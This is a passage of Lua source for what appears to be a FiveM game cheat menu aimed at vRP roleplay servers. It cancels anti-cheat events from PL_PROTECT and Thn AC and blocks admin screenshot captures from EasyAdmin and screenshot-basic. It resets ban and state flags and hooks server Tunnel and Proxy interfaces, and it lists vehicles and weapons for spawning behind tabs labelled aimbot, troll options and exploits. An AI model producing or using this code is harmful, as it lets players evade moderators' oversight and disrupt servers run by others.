        "thn:peddecoration",
        "thn:fixed",
        "thn:setSpectator",
        "thn:pegaidiota2",
        "thn:eventServer",
        "thn:receiveEntity",
        "thn:receivePed",
        "thn:receiveObject",
        "thn:receiveVeh",
        "thn:vehicleNetworked",
        "thn:eventChecker",
        "thn:validateResource",
        "thn:server:receberDados:beta",
        "SetEntityCoords:ThnAC",
        "SetEntityInvincible:ThnAC"
    }

    for _, eventName in ipairs(eventsToCancel) do
        RegisterNetEvent(eventName)
        AddEventHandler(eventName, function()
            CancelEvent()
        end)
    end
end

if getsource('PL_PROTECT') then
    Citizen.CreateThread(function()
        RegisterNetEvent("screenshot_basic:requestScreenshot")
        AddEventHandler(
            "screenshot_basic:requestScreenshot",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("EasyAdmin:CaptureScreenshot")
        AddEventHandler(
            "EasyAdmin:CaptureScreenshot",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("requestScreenshot")
        AddEventHandler(
            "requestScreenshot",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("__cfx_nui:screenshot_created")
        AddEventHandler(
            "__cfx_nui:screenshot_created",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("screenshot-basic")
        AddEventHandler(
            "screenshot-basic",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("requestScreenshotUpload")
        AddEventHandler(
            "requestScreenshotUpload",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        AddEventHandler(
            "EasyAdmin:FreezePlayer",
            function(P)
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                TriggerEvent("EasyAdmin:FreezePlayer")
            end
        )

        RegisterNetEvent("likizao_ac:tunnel_req")
        AddEventHandler(
            "vRP:likizao_ac:tunnel_req",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                TriggerServerEvent("likizao_ac:tunnel_req", "ERROR")
                CancelEvent()
            end
        )
        RegisterNetEvent("isAdmin")
        AddEventHandler(
            "isAdmin",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                TriggerServerEvent("isAdmin", "ERROR")
                CancelEvent()
            end
        )
        RegisterNetEvent("likizao_ac:tunnel_req")
        AddEventHandler(
            "isAdmin",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                TriggerServerEvent("likizao_ac", "ERROR")
                CancelEvent()
            end
        )
        RegisterNetEvent("1676171191:U27T")
        AddEventHandler(
            "1676171191:U27T",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                TriggerServerEvent("1676171191:U27T", "ERROR")
                CancelEvent()
            end
        )
        RegisterNetEvent("screenshot_basic:requestScreenshot")
        AddEventHandler(
            "screenshot_basic:requestScreenshot",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("EasyAdmin:CaptureScreenshot")
        AddEventHandler(
            "EasyAdmin:CaptureScreenshot",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("requestScreenshot")
        AddEventHandler(
            "requestScreenshot",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("__cfx_nui:screenshot_created")
        AddEventHandler(
            "__cfx_nui:screenshot_created",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("screenshot-basic")
        AddEventHandler(
            "print",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("requestScreenshotUpload")
        AddEventHandler(
            "requestScreenshotUpload",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        AddEventHandler(
            "EasyAdmin:FreezePlayer",
            function(P)
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                TriggerEvent("EasyAdmin:FreezePlayer")
            end
        )
    end)

    Notify("Aviso", "camargo-warn", "Anticheat Detectado: PL_PROTECT", 255, 255, 255)
    LocalPlayer.state.games = true
    LocalPlayer.state.pvp = true
    GlobalState.NovatTime = 0
    LocalPlayer.state.onlineTime = 250
    LocalPlayer.state.lasttry = nil
    LocalPlayer.state.lasttry = false
    LocalPlayer.state.ban2 = nil
    LocalPlayer.state.ban2 = false
    LocalPlayer.state.controlDisabled = nil
    LocalPlayer.state.controlDisabled = false
    LocalPlayer.state.vht = nil
    LocalPlayer.state.vht = false
    GlobalState.acName = nil
    GlobalState.acName = false
    _Banargsv4 = nil
    _Banargsv4 = false
    CreatePickup = true
    GlobalState.slsthashs = nil
    GlobalState.slsthashs = false
    GlobalState.ams = nil
    GlobalState.ams = false
    ____weapon_types = nil
    ____weapon_types = false
    LocalPlayer.state.lasttry = nil
    LocalPlayer.state.lasttry = false
    LocalPlayer.state.ban2 = nil
    LocalPlayer.state.ban2 = false
    LocalPlayer.state.controlDisabled = nil
    LocalPlayer.state.controlDisabled = false
    LocalPlayer.state.vht = nil
    LocalPlayer.state.vht = false
    GlobalState.acName = nil
    GlobalState.acName = false
    _Banargsv4 = nil
    _Banargsv4 = false
    CreatePickup = true
    GlobalState.slsthashs = nil
    GlobalState.slsthashs = false
    GlobalState.ams = nil
    GlobalState.ams = false
    ____weapon_types = nil
    ____weapon_types = false
end


if getsource('vrp') then
    local modules = {}
    function module(rsc, path)
        if path == nil then
            path = rsc
            rsc = 'vrp'
        end

        local key = rsc .. path
        local module = modules[key]
        if module then
            return module
        else
            local code = LoadResourceFile(rsc, path .. '.lua')
            if code then
                local f, err = load(code, rsc .. '/' .. path .. '.lua')
                if f then
                    local ok, res = xpcall(f, debug.traceback)
                    if ok then
                        modules[key] = res
                        return res
                    else
                        error('error loading module ' .. rsc .. '/' .. path .. ':' .. res)
                    end
                else
                    error('error parsing module ' .. rsc .. '/' .. path .. ':' .. debug.traceback(err))
                end
            else
                error('resource file ' .. rsc .. '/' .. path .. '.lua not found')
            end
        end
    end

    local Tunnel = module('vrp', 'lib/Tunnel')
    local Proxy = module('vrp', 'lib/Proxy')
    local Tools = module('vrp', 'lib/Tools')
    tvRP = {}
    Tunnel.bindInterface('vRP', tvRP)
    vRPserver = Tunnel.getInterface('vRP')
    Proxy.addInterface('vRP', tvRP)
    tvRP = Proxy.getInterface('vRP')
    Proxy = {}

    local proxy_rdata = {}
    local function proxy_callback(rvalues)
        proxy_rdata = rvalues
    end

    local function proxy_resolve(itable, key)
        local iname = getmetatable(itable).name
        local fcall = function(args, callback)
            if args == nil then
                args = {}
            end
            TriggerEvent(iname .. ':proxy', key, args, proxy_callback)
            return table.unpack(proxy_rdata)
        end
        itable[key] = fcall
        return fcall
    end

    local function wait(self)
        local rets = Citizen.Await(self.p)
        if not rets then
            rets = self.r
        end
        return table.unpack(rets, 1, table.maxn(rets))
    end

    local function areturn(self, ...)
        self.r = { ... }
        self.p:resolve(self.r)
    end

    function async(func)
        if func then
            Citizen.CreateThreadNow(func)
        else
            return setmetatable({ wait = wait, p = promise.new() }, { __call = areturn })
        end
    end

    local Proxy = {}
    local callbacks = setmetatable({}, { __mode = 'v' })
    local rscname = GetCurrentResourceName()


    local function proxy_resolve(itable, key)
        local mtable = getmetatable(itable)
        local iname = mtable.name
        local ids = mtable.ids
        local callbacks = mtable.callbacks
        local identifier = mtable.identifier
        local fname = key
        local no_wait = false

        if string.sub(key, 1, 1) == '_' then
            fname = string.sub(key, 2)
            no_wait = true
        end

        local fcall = function(...)
            local rid, r
            local profile
            if no_wait then
                rid = -1
            else
                r = async()
                rid = ids:gen()
                callbacks[rid] = r
            end

            local args = { ... }
            --print('[PROXY]: ',iname..':proxy',fname, args, identifier, rid)
            TriggerEvent(iname .. ':proxy', fname, args, identifier, rid)
            if not no_wait then
                return r:wait()
            end
        end
        itable[key] = fcall
        return fcall
    end

    function Proxy.addInterface(name, itable)
        AddEventHandler(name .. ':proxy', function(member, args, identifier, rid)
            local f = itable[member]
            local rets = {}

            if type(f) == 'function' then
                rets = { f(table.unpack(args, 1, table.maxn(args))) }
            end
            if rid >= 0 then
                TriggerEvent(name .. ':' .. identifier .. ':proxy_res', rid, rets)
            end
        end)
    end

    function Proxy.getInterface(name, identifier)
        if not identifier then identifier = GetCurrentResourceName() end
        local ids = Tools.newIDGenerator()
        local callbacks = {}
        local r = setmetatable({},
            { __index = proxy_resolve, name = name, ids = ids, callbacks = callbacks, identifier = identifier })
        AddEventHandler(name .. ':' .. identifier .. ':proxy_res', function(rid, rets)
            local callback = callbacks[rid]
            if callback then
                ids:free(rid)
                callbacks[rid] = nil
                callback(table.unpack(rets, 1, table.maxn(rets)))
            end
        end)
        return r
    end

    function table.maxn(t)
        local max = 0

        for k, v in pairs(t) do
            local n = tonumber(k)

            if n and n > max then
                max = n
            end
        end
        return max
    end
end



local vez = 0

local tvRP = {}
pcall(function()
    if getsource('vrp') then
        local Tunnel = module('vrp', 'lib/Tunnel')
        local Proxy = module('vrp', 'lib/Proxy')
        local Tools = module('vrp', 'lib/Tools')

        Tunnel.bindInterface("vRP", tvRP)
        vRPserver = Tunnel.getInterface("vRP")
        Proxy.addInterface("vRP", tvRP)
        tvRP = Proxy.getInterface('vRP')
    end
end)

local r5_0, r6_0 = GetActiveScreenResolution()

local r7_0 = 680

local r8_0 = 562

local r11_0 = {

    x = r5_0 / 2 - r7_0 / 2,

    y = r6_0 / 2 - r8_0 / 2,

    width = r7_0,

    height = r8_0,

    showMenu = false,

    render = true,

    randomDict = math.random(1000000, 9999999),

    selectedPlayer = nil,

    selectedVehicle = nil,

    selectedResource = nil,

    stoppedResources = {},

    scroll = {},

    colorpickers = {

        active = nil,

    },

}


--main

local psychovars =

{

    main =

    {

        drawing = false,

        tab = "self",

        key = 348,

    },



    list =

    {

        MesosnuX = 0.5, MesosnuY = 0.5, MesosnuX2 = 0.5, MesosnuY2 = 0.5, MesosnuW = 0.5, MesosnuH = 0.5

    },



    definitions =

    {

        isolated = false,

    }

}

--interface

local overlay =

{

    opacitys =

    {

        main = 0,

        contents = 0,

        togglebind = 0,

    },



    colors =

    {

        main = { r = 28, g = 92, b = 255 },

    },



    outhers = { disabling = false },



    anim = {

        tabpos = { x = 0.5, y = 0.5, xdestin = 0.31, ydestin = 0.399 },

        boxanim = { first = false }

    },



    cursorpos = { x = 0.5, y = 0.1 }

}

local texturevariables =

{

    renders = {

        ["MainInterface"] = { txd = "main-interface", txn = "main-interface", url = "https://rad-raindrop-d4d7f3.netlify.app/imagemcamargo.png", width = 1217, height = 864 },

        ["Menu-Box"] = { txd = "menu-box", txn = "menu-box", url = "https://farinha21.github.io/farinha-menu-sigma/index?image=menu-box", width = 1217, height = 864 },

        ["Tab-Anim"] = { txd = "tab-anim", txn = "tab-anim", url = "https://farinha21.github.io/farinha-menu-sigma/index?image=TabAnim", width = 1217, height = 864 },

        ["Button"] = { txd = "psycho-button", txn = "psycho-button", url = "", width = 1217, height = 864 },

        ["KeyBoard"] = { txd = "keyboard", txn = "keyboard", url = "", width = 1217, height = 864 },

        ["Toggle-set"] = { txd = "toggle-set", txn = "toggle-set", url = "https://farinha21.github.io/farinha-menu-sigma/index?image=checkbox", width = 1360, height = 768 },

        ["ListAdm"] = { txd = "ListAdm", txn = "ListAdm", url = "https://raw.githubusercontent.com/scmrl/xithwid/refs/heads/main/AdminList.png", width = 310, height = 51 },

    },

    textures = { rendertexture = CreateRuntimeTextureFromDuiHandle, runtimetxd = CreateRuntimeTxd, duihandle = GetDuiHandle, imagecreate = CreateDui },

    uitexture = HasStreamedTextureDictLoaded("main-interface")

}


if texturevariables.uitexture ~= 1 then
    for i, k in pairs(texturevariables.renders) do
        texturevariables.textures.rendertexture(texturevariables.textures.runtimetxd(k.txd), k.txn,
            texturevariables.textures.duihandle(texturevariables.textures.imagecreate(k.url, k.width, k.height)))
    end
end



--outhers

local playersselected = {}

local vehiclesSelected = {}

local weaponsSelected = {}

local admlist = {}

local admlistpedID = {}

local admobs = {}

local C0rn0s = {}

local dasihbudsauihdsahuidsuh2 = { r = 28, g = 92, b = 255 }



local listVariables =

{

    distanceLimit = 999

}



local PlayerListRequire = {

    Menu = {

        MenuX = 0.68,

        MenuY = 0.5,

    }

}



local to_add_X = PlayerListRequire.Menu.MenuX - 0.5

local to_add_Y = PlayerListRequire.Menu.MenuY - 0.5



local Drag = {

    LoaderX = 0.0, LoaderY = 0.0,

}



local binds =

{

    buttons =

    {



    },



    toggles =

    {



    }



}



local Sliders =

{

    ["SliderTest"] = { max = 100, min = 1, value = 20 },

    ["n0clip"] = { max = 10, min = 1, value = 2 },

    ["fastrun"] = { max = 100, min = 2, value = 10 },

    ["speedboost"] = { max = 300, min = 20, value = 50 },

    ["s4populo"] = { max = 100, min = 2, value = 20 },

    ["n0st4ff"] = { max = 400, min = 2, value = 30 },

    ['carregar'] = { max = 200, min = 10, value = 20 },

    ['circulo'] = { max = 200, min = 10, value = 20 },

    ['Sm00th1ng'] = { max = 200, min = 10, value = 20 },

}



--outhers

scrolls = {

    ["playerList"] = { static = 0.0, static2 = 0.0 },

    ["weaponList"] = { static = 0.0, static2 = 0.0 },

    ["vehicleList"] = { static = 0.0, static2 = 0.0 },

    ["vehicleSpawnList"] = { static = 0.0, static2 = 0.0 },

    ["self"] = { static = 0.0, static2 = 0.0 },

    ["vehicle"] = { static = 0.0, static2 = 0.0 },

    ["vehicles"] = { static = 0.0, static2 = 0.0 },

    ["visual"] = { static = 0.0, static2 = 0.0 },

    ["weapon"] = { static = 0.0, static2 = 0.0 },

    ["aimbot"] = { static = 0.0, static2 = 0.0 },

    ["players"] = { static = 0.0, static2 = 0.0 },

    ["trolloptions"] = { static = 0.0, static2 = 0.0 },

    ["trolloptionsleft"] = { static = 0.0, static2 = 0.0 },

    ["exploits"] = { static = 0.0, static2 = 0.0 },





}



--veh list

local vehicleListSpawn = {

    { name = "T20",              hash = "t20" },
    { name = "Adder",            hash = "adder" },
    { name = "Kuruma",           hash = "kuruma" },
    { name = "Akuma",            hash = "akuma" },
    { name = "Panto",            hash = "Panto" },
    { name = "T20",              hash = "t20" },
    { name = "Adder",            hash = "adder" },
    { name = "Carro do Batman",  hash = "vigilante" },
    { name = "Raiden",           hash = "raiden" },
    { name = "Kart",             hash = "veto2" },
    { name = "Carro esportivo",  hash = "ignus" },
    { name = "Carro esportivo2", hash = "prototipo" },
    { name = "Zentorno",         hash = "zentorno" },
    { name = "Xj6",              hash = "xj6" },
    { name = "Pcx",              hash = "pcx" },
    { name = "Sanchez",          hash = "sanchez2" },

}






local vehicleListMods = {

    { name = "Oppressor2",                       hash = "0x7B54A9D3" },

    { name = "Oppressor2",                       hash = "oppressor2" },

    { name = "Ferrari F12 TDF",                  hash = "rmodf12tdf" },

    { name = "Ferrari F40",                      hash = "rmodf40" },

    { name = "Mercedes G 63",                    hash = "rmodgt63" },

    { name = "Nissan GT r50",                    hash = "rmodgtr50" },

    { name = "BMW i8 KS",                        hash = "rmodi8ks" },

    { name = "Jeep Grand Cherokee",              hash = "rmodjeep" },

    { name = "Aston Martin",                     hash = "rmodmartin" },

    { name = "Porsche 918",                      hash = "rmodporsche918" },

    { name = "Audi RS7 Body kit",                hash = "rmodrs7" },

    { name = "BMW X6M",                          hash = "rmodx6" },

    { name = "Audi RS6 Avant",                   hash = "rs6avant20" },

    { name = "Tesla Prior",                      hash = "teslaprior" },

    { name = "Toyota Supra",                     hash = "toyotasupra" },

    { name = "Volkswagen Up",                    hash = "up" },

    { name = "Lamborghini Urus",                 hash = "urus" },

    { name = "Aston Martin Vanquish",            hash = "vanquishzs" },

    { name = "Zlayworks Nissan Silvia S15 Z15",  hash = "z15tribal" },

    { name = "Mercedes GT63",                    hash = "mercedesgt63" },

    { name = "Volkswagen Amarok Rebaixada",      hash = "amarokreb" },

    { name = "Bmw x6",                           hash = "21bmwx6" },

    { name = "Porsche 718b",                     hash = "718b" },

    { name = "Mercedes AMG C250",                hash = "c250re" },

    { name = "Lamborghini Aventador",            hash = "ahksv" },

    { name = "Bugatti Chiron S",                 hash = "chironss" },

    { name = "Volkswagen Amarok",                hash = "amarok" },

    { name = "MercedeAmg GT C",                  hash = "amggtc" },

    { name = "BMW M4 GTS",                       hash = "bmwm4gts" },

    { name = "Volkswagen Golf 7 GTI",            hash = "golf7gti" },

    { name = "Porsche GT2",                      hash = "gt2rsmr" },

    { name = "Nissan Skyline R34 MOD",           hash = "bnr34" },

    { name = "GTR Liberty Walk",                 hash = "lwgtr" },

    { name = "Mercedes AMG GT Mansory",          hash = "mansamgt21" },

    { name = "Corvette C8 MOD",                  hash = "c8p1" },

    { name = "Mercedes AMG C63",                 hash = "c63" },

    { name = "Lamborghini Essenza SCV12",        hash = "rmodessenza" },

    { name = "Koenigsegg Jesko",                 hash = "rmodjesko" },

    { name = "McLaren P1 GTR",                   hash = "rmodp1gtr" },

    { name = "Lamborghini Sian",                 hash = "rmodsianr" },

    { name = "Ford Mustang",                     hash = "fordmustang" },

    { name = "Chevrolet S10 HC",                 hash = "s10hc" },

    { name = "Porsche Taycan 2",                 hash = "taycan2" },

    { name = "Lamborghini Veneno",               hash = "veneno" },

    { name = "McLaren GT2",                      hash = "foxgt2" },

    { name = "Senna",                            hash = "foxsenna" },

    { name = "Koenigsegg Gemera",                hash = "gemera" },

    { name = "La Ferrari",                       hash = "laferrari17" },

    { name = "Lamborghini Huracan Liberty Walk", hash = "lamborghinihuracanlw" },

    { name = "Lamborghini Aventador LP700",      hash = "lp700r" },

    { name = "BMW M8 Mansory",                   hash = "mansm8civil" },

    { name = "Porsche 911",                      hash = "porsche911" },

    { name = "Mercedes G65",                     hash = "rmodg65" },

    { name = "Toyota Supra 2",                   hash = "toyotasupra2" },

    { name = "Audi TT RS R19",                   hash = "ttrsr19" },

    { name = "Range Rover Velar",                hash = "velar" },

    { name = "Silvia",                           hash = "silvia" },

    { name = "Mansory",                          hash = "17mansorypnmr" },

    { name = "Lamborghini Huracan",              hash = "18performante" },

    { name = "Nissan 180sx",                     hash = "180sx" },

    { name = "Nissan 240sx",                     hash = "240sx" },

    { name = "Nissan 350z",                      hash = "350z" },

    { name = "Porsche 911t4s",                   hash = "911t4s" },

    { name = "Audi RS7",                         hash = "audirs7" },

    { name = "BMW Z4",                           hash = "bmwz4" },

    { name = "Corvette C7",                      hash = "c7" },

    { name = "Chevrolet Celta",                  hash = "celta" },

    { name = "Volkswagen Saveiro",               hash = "saveiro" },

    { name = "Chevrolet Chevette",               hash = "chevette" },

    { name = "Jeep Compass",                     hash = "compass" },

    { name = "Lancer Evolution Evo9 2022",       hash = "evo9_2022" },

    { name = "Mazda R7",                         hash = "fd" },

    { name = "Ferrari Italia",                   hash = "ferrariitalia" },

    { name = "McLaren Mansory 720s",             hash = "fox720m" },

    { name = "Lamborghini Huracan Evo",          hash = "foxevo" },

    { name = "Golf Sapão",                       hash = "golfsapao" },

    { name = "Lamborghini Hurper",               hash = "hurper" },

    { name = "Volkswagen Jetta GLI",             hash = "jettagli" },

    { name = "Lancer Evolution EVO X",           hash = "lancerevolutionx" },

    { name = "BMW M4",                           hash = "m4f82" },

    { name = "Chevrolet Monza",                  hash = "monza" },

    { name = "Mustang G19",                      hash = "mustang19" },

    { name = "Nissan GTR R35",                   hash = "nissangtr" },

    { name = "Nissan Skyline r34",               hash = "nissanskyliner34" },

    { name = "Ferrari 488 Pista Spider",         hash = "pistaspider19" },

    { name = "Audi R8c",                         hash = "r8c" },

    { name = "GTR R33",                          hash = "r33" },

    { name = "Bentley Mulliner Bacalar",         hash = "rmodbacalar" },

    { name = "Bentley Continental GT",           hash = "rmodbentleygt" }

}





local function HashValid(hash)
    local model = hash

    if IsModelValid(model) and IsModelAVehicle(model) and not IsModelAPed(model) then
        return true
    else
        return false
    end
end



for _, veiculo in ipairs(vehicleListMods) do
    if HashValid(veiculo.hash) then
        table.insert(vehicleListSpawn, veiculo)
    end
end



-- Vehicle

local v3111cul00sl11st = { "divo", "g500", "h2carb",

    "teslax", "BENTAYGA17", "yz450f", "tmsm", "rmz250",

    "WRAITH", "URUS", "demon", "BMWI8", "rrst", "M6F13",

    "CHARGER", "19gt500", "exor", "SVJ", "demonhawk",

    "911", "GT2RS", "CONTSS18", "FERRARI812", "BENTAYGA17",

    "458spc", "63Lb", "c63scoupe", "MVISIONGT", "sv",

    "GTRC", "SENNA", "C7", "LWGTR", "AR8Lb", "g63mg",

    "scaldarsi", "bm8c", "jes", "cczl", "c8", "bentaygam",

    "mlmansory", "dawn", "ursa", "gle63c", "sr650fly",

    "BMWM8", "19S650", "amggtsmansory", "G63AMG6x6",

    "qx56", "vantage", "svr16", "x6m", "a8lw12",

    "corvetteZR1", "720stc", "TMODEL", "kiagt",

    "rs5r", "R8v10", "cayenne", "NISALTIMA", "TR22",

    "Mb400", "2020silv", "foxrossa", "M3E30", "foxharley2",

    "foxharley1", "denalihd", "fox600lt", "m6x6", "foxrover1",

    "tonkat", "kuga", "silvias15", "rx7rb", "fto", "mr2sw20",

    "eclipsegt06", "SkylineGTR", "CAN", "2020ss", "terzo",

    "rmodveneno", "gurkha", "p1", "viper", "TypeR17", "sc18",

    "XJ", "lp700", "TAMPA3", "Huracan", "TESLAPD", "S63W222",

    "foxct", "foxsterrato", "foxsian", "foxevo", "foxsupra",

    "h3", "foxleggera", "rmodi8mlb", "CORVETTe", "r1250", "f8rarri",

    "forgiato", "ts1", "jeepg", "GRANDGT18", "2008f150", "lccreaper",

    "REMOWER", "EVO10", "vip8", "ELLCHARG", "G770", "IMPALASS2",

    "fox720s", "CHIRON", "polp1", "AVENTADOR", "Custom",

    "CENTENARIo", "Mustang", "rmodamgc63", "audipd",

    "MRAP", "CHIRON17", "can", "rmodmustang", "beck",

    "bugatti", "foxezri", "exgtr", "f824slw", "rculi",

    "raptor150", "rs6c8", "ren_clio_5", "caprice13",

    "elantra07", "familiac", "trhawk", "ramlh20",

    "mach1", "cbr1000rrr", "rmodmi8lb", "nisanskyliner34",

    "boss302", "nissangtr", "audirs6", "audirs7", "r1200",

    "bmwm3f80", "bmwm4gts", "ferrariitalia",

    "lamborghinihuracan", "lancerevolution9", "lancerevolutionx",

    "mazdarx7", "nissan370z", "teslaprior", "amggt63s", "18performante",

    "huracangt3evo", "rmodsianr", "ahksv", "rmodessenza", "pistaspider19",

    "nissangtr",

    "rmodf40",

    "f8t",

    "m3e46",

    "rmodbmwm8",

    "bmws",

    "bmwm4gts",

    "M2F22",

    "rmodx6",

    "gs2013",

    "z4bmw",

    "bmwr1250rocam",

    "audiq8",

    "rs6wb",

    "rmodlegosenna",

    "foxsenna",

    "foxgt2",

    "fox720m ",

    "elva",

    "350z",

    "rmodskyline34",

    "nissanskyliner34",

    "r34",

    "nissanskyliner35",

    "rmodgtr50",

    "nissantitan17",

    "celta",

    "civic",

    "civictyper",

    "saveiro",

    "chevette",

    "amarok",

    "l200",

    "golf7gti",

    "rmodcamaro",

    "rmodjeep",

    "monza",

    "s10",

    "ram2500",

    "weevil",

    "sonata18",

    "civic2016",

    "amggtc",

    "rmodgt63",

    "c63w205",

    "718b",

    "911r",

    "pboxstergts",

    "panamera17turbo",

    "pct18",

    "rmodbentleygt",

    "cx75",

    "evoque",

    "fordmustang",

    "rmodbacalar",

    "rmodjesko",

    "agerars",

    "rmodmartin",

    "a80",

    "gemera",

    "brickade",

    "rallytruck",

    "guardian",

    "rmodtracktor",

    "pbus",

    "panigale",

    "hornet",

    "hayabusa",

    "r1",

    "r6",

    "tiger",

    "xj6",

    "xt660vip",

    "fz07",

    "africat",

    "z1000",

    "zx6r",

    "zx10",

    "bmwr1250rocam",

    "dm1200",

    "gs2013",

    "gsxr",

    "nh2r",

    "f850",

    "tenere1200",

    "biz25",

    "veloster ",

    "f150",

    "fq2",

    "fnflan",

    "ff4wrx",

    "2f2fmk4",

    "fnfmk4",

    "fnfmits",

    "fnfrx7",

    "2f2fmle7",

    "2f2fgts",

    "supervolito",

    "supervolito2",

    "frogger",

    "wrcb500x",

    "Wrgtr",

    "WRa45",

    "Wrc63s",

    "Wrcb500",

    "amggtr",

    "mercedesgt",

    "mercxclass",

    "nc750x",

    "jetta2017",

    "z4bmw",

    "c63w205",

    "pboxstergts",

    "gs2013",

    "pcx",

    "f850",

    "rmodessenza",

    "adr8",

    "718b",

}



local weaponList = {
    { name = "Canivete",                 hash = "weapon_switchblade" },

    { name = "Taco",                     hash = "weapon_bat" },

    { name = "Faca",                     hash = "weapon_knife" },

    { name = "Adaga",                    hash = "weapon_dagger" },

    { name = "Pistola Gravidade",        hash = "weapon_raypistol" },

    { name = "Pistola .50",              hash = "weapon_pistol50" },

    { name = "Pistola MK2",              hash = "weapon_pistol_mk2" },

    { name = "Combat Pistol",            hash = "weapon_combatpistol" },

    { name = "Taser",                    hash = "weapon_stungun" },

    { name = "Arma Laser",               hash = "weapon_raycarbine" },

    { name = "Mini gun laser",           hash = "weapon_rayminigun" },

    { name = "Revolver",                 hash = "weapon_revolver" },

    { name = "Special Carbine",          hash = "weapon_specialcarbine" },

    { name = "Special Carbine MK2",      hash = "weapon_specialcarbine_mk2" },

    { name = "Pump Shotgun",             hash = "weapon_pumpshotgun" },

    { name = "Mini gun",                 hash = "weapon_minigun" },

    { name = "Assault Rifle",            hash = "weapon_assaultrifle" },

    { name = "Carbine Rifle",            hash = "weapon_carbinerifle" },

    { name = "Sniper Rifle",             hash = "weapon_sniperrifle" },

    { name = "Heavy Sniper",             hash = "weapon_heavysniper" },

    { name = "Machine Gun",              hash = "weapon_machinegun" },

    { name = "RPG",                      hash = "weapon_rpg" },

    { name = "Grenade Launcher",         hash = "weapon_grenadelauncher" },

    { name = "C4",                       hash = "weapon_stickybomb" },

    { name = "Granada",                  hash = "weapon_grenade" },

    { name = "Molotov Cocktail",         hash = "weapon_molotov" },

    { name = "Ak47",                     hash = "weapon_assaultrifle" },

    { name = "Ak47 MK2",                 hash = "weapon_assaultrifle_mk2" },

    { name = "Carbine",                  hash = "weapon_carbinerifle" },

    { name = "Carbine MK2",              hash = "weapon_carbinerifle_mk2" },

    { name = "Advanced Rifle",           hash = "weapon_advancedrifle" },

    { name = "Bullpup Rifle",            hash = "weapon_bullpuprifle" },

    { name = "Bullpup Rifle MK2",        hash = "weapon_bullpuprifle_mk2" },

    { name = "Compact Rifle",            hash = "weapon_compactrifle" },

    { name = "Military Rifle",           hash = "weapon_militaryrifle" },

    { name = "Heavy Rifle",              hash = "weapon_heavyrifle" },

    { name = "Tactical Rifle",           hash = "weapon_tacticalrifle" },

    { name = "MG",                       hash = "weapon_mg" },

    { name = "Combat MG",                hash = "weapon_combatmg" },

    { name = "Combat MG MK2",            hash = "weapon_combatmg_mk2" },

    { name = "Gusenberg Sweeper",        hash = "weapon_gusenberg" },

    { name = "Heavy Sniper MK2",         hash = "weapon_heavysniper_mk2" },

    { name = "Minigun",                  hash = "weapon_minigun" },

    { name = "Sticky Bomb",              hash = "weapon_stickybomb" },

    { name = "Doze",                     hash = "weapon_pumpshotgun" },

    { name = "Doze MK2",                 hash = "weapon_pumpshotgun_mk2" },

    { name = "Double-Action Revolver",   hash = "weapon_doubleaction" },

    { name = "Marksman Pistol",          hash = "weapon_marksmanpistol" },

    { name = "Navy Revolver",            hash = "weapon_navyrevolver" },

    { name = "Grenade",                  hash = "weapon_grenade" },

    { name = "Stun Gun",                 hash = "weapon_stungun" },

    { name = "Nightstick",               hash = "weapon_nightstick" },

    { name = "Flashlight",               hash = "weapon_flashlight" },

    { name = "Hammer",                   hash = "weapon_hammer" },

    { name = "Battle Axe",               hash = "weapon_battleaxe" },

    { name = "Pool Cue",                 hash = "weapon_poolcue" },

    { name = "Wrench",                   hash = "weapon_wrench" },

    { name = "Fire Extinguisher",        hash = "weapon_fireextinguisher" },

    { name = "Hatchet",                  hash = "weapon_hatchet" },

    { name = "Knuckle Duster",           hash = "weapon_knuckle" },

    { name = "Machete",                  hash = "weapon_machete" },

    { name = "Switchblade",              hash = "weapon_switchblade" },

    { name = "Bottle",                   hash = "weapon_bottle" },

    { name = "Stone Hatchet",            hash = "weapon_stone_hatchet" },

    { name = "Vintage Pistol",           hash = "weapon_vintage_pistol" },

    { name = "Flare Gun",                hash = "weapon_flaregun" },

    { name = "Musket",                   hash = "weapon_musket" },

    { name = "Heavy Shotgun",            hash = "weapon_heavyshotgun" },

    { name = "Sweeper Shotgun",          hash = "weapon_sweepershotgun" },

    { name = "Double-Barrel Shotgun",    hash = "weapon_dbshotgun" },

    { name = "Assault Shotgun",          hash = "weapon_assaultshotgun" },

    { name = "Bullpup Shotgun",          hash = "weapon_bullpupshotgun" },

    { name = "Pump Shotgun MK2",         hash = "weapon_pumpshotgun_mk2" },

    { name = "Compact Grenade Launcher", hash = "weapon_compactlauncher" },

    { name = "Ray Carbine",              hash = "weapon_raycarbine" },

    { name = "Up-n-Atomizer",            hash = "weapon_raygun" },

    { name = "Unholy Hellbringer",       hash = "weapon_rayminigun" },

